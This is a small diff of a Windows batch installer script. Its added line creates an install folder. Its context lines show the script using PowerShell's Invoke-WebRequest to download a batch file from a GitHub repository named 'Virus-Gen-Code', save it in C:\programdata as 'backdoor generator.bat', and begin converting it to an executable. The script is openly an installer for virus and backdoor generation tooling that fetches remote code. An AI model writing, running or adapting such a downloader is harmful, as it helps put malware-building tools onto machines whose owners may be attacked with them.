@@ -54,6 +54,7 @@ del gitDL.exe
 echo git was installed
 :skip_git
 timeout 1 /nobreak >nul
+if not exist %install_location% mkdir %install_location%
 echo downloading code...
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/updater.bat").Content >C:\programdata\backdoor generator.bat
 echo converting file to exe...
